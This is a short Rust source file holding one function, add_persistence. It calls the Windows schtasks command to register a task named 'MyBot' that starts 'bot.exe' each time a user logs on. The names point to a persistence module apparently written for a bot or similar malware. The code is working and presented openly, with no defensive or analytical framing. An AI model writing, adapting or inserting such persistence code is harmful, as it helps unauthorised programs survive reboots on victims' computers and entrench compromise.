use std::process::Command;
use log::error;

pub fn add_persistence() {
    let status = Command::new("schtasks")
        .arg("/create")
        .arg("/sc")
        .arg("onlogon")
        .arg("/tn")
        .arg("MyBot")
        .arg("/tr")
        .arg("\"C:\\path\\to\\bot.exe\"")
        .status();

    match status {
        Ok(s) if s.success() => println!("Persistence added successfully."),
        Ok(_) | Err(_) => error!("Failed to add persistence."),
    }
}
